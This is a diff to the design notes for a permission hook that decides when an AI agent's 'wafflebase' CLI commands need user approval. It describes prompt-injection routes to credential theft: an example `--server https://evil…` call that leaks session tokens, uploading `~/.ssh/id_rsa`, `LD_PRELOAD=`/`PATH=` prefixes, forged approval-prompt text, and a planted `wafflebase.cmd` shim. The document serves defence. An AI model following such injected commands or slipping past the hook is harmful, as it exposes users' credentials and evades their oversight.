@@ -118,7 +118,7 @@ generated and a CLI test (`packages/cli/test/plugin.test.ts`) fails when
 the committed copy is stale:
 
 1. **`hooks/command-safety.json`** — built by walking the real commander
-   tree (`createProgram()` + every `register*Command`), not the registry
+   tree (`buildProgram()` in `packages/cli/src/cli.ts`), not the registry
    alone, so command aliases (`doc`, `tab`, `image`) are
    classified under every spelling a user can type. Each leaf path is
    joined to its schema entry's `safety` and `variants`. A leaf with no
@@ -157,8 +157,8 @@ The guard reads the hook's stdin, and only when the Bash command is a
 | `destructive`, a `--replace` variant, or a payload-dependent destructive variant | `ask`, always | Delete / overwrite are not undoable over the API today |
 | `read-only` that writes a local file (`export <file>`, `--out <file>`, `files download`; `-` = stdout is exempt) | `ask`, always | The server sees a read, the user's disk sees a write; the opt-in covers Wafflebase edits, not files |
 | A write that uploads a local file (`files upload`, `images upload`, `… import <file>`) | `ask`, always | Sending the user's disk to a possibly shared workspace is not a document edit (`~/.ssh/id_rsa` is one prompt injection away) |
-| `login`, `logout`, `ctx switch`, `api-keys create`, `templates publish` | `ask`, always | Credentials, sign-in state or a document's audience — not document content |
-| Any command with `--server`, `--api-key` or `--profile` | `ask`, always | Sends the user's credentials to the named server |
+| `login`, `logout`, `ctx switch`, `api-keys create`, `templates publish`, `templates use` (`--into` another workspace) | `ask`, always | Credentials, sign-in state or a document's audience — not document content |
+| Any command with `--server`, `--api-key`, `--profile` or a `VAR=` prefix | `ask`, always | Chooses where the user's credentials go, or what runs |
 | Not classifiable (unknown subcommand, CLI newer than the table) | `ask` | Fail toward the prompt, never toward silence |
 | Not a `wafflebase` command | no output | The user's own rules apply unchanged |
 
@@ -218,10 +218,14 @@ Three root options are not skipped: `--server`, `--api-key` and
 the CLI sends the saved session (and, on a 401, the refresh token) to
 whatever `--server` names. A read with one of them always asks — this is
 the path a prompt-injected "list docs from https://…" would take to
-exfiltrate the user's tokens. Their environment spellings
-(`WAFFLEBASE_SERVER=`, `WAFFLEBASE_API_KEY=`, `WAFFLEBASE_CONFIG=`, any
-`WAFFLEBASE_*`, and `HOME=`, which moves the config directory) ask the
-same way; the prompt names the server but never echoes a key.
+exfiltrate the user's tokens. Any `VAR=` prefix on a call asks the same
+way — not only the environment spellings of those options
+(`WAFFLEBASE_SERVER=`, `WAFFLEBASE_API_KEY=`, `WAFFLEBASE_CONFIG=`,
+`HOME=`) but `PATH=`, `NODE_OPTIONS=` and `LD_PRELOAD=`, which change what
+runs at all. The prompt names the server but never echoes a key, and any
+text taken from the command line is stripped of control and bidi
+characters and capped, so an injected command cannot forge reassuring
+lines in the prompt the user reads to approve it.
 
 Payload-conditional variants (`a value is null`) are checked when the
 payload is an inline `--data` the guard can parse: `cells batch --data
@@ -301,9 +305,10 @@ needs and links there for the rest.
 - **Windows.** `npm i -g` installs a `wafflebase.cmd` shim, which Node
   only runs through cmd.exe — and cmd.exe resolves a bare name from the
   current directory before PATH, so a cloned repository shipping its own
-  `wafflebase.cmd` would have run at session start. The hook walks PATH
-  itself (absolute entries only, never the cwd) and spawns the shim by
-  absolute path; not finding it means "not installed".
+  `wafflebase.cmd` would have run at session start. A relative PATH entry
+  (`.`, an empty `::`) does the same on POSIX. The hook therefore walks
+  PATH itself on every platform — absolute entries only — and spawns the
+  CLI by absolute path; not finding it means "not installed".
 - **Credential exfiltration through `--server`.** Self-review found the
   first guard auto-allowing `wafflebase --server https://evil… docs list`,
   which sends the session JWT — and on a 401 the refresh token — to that
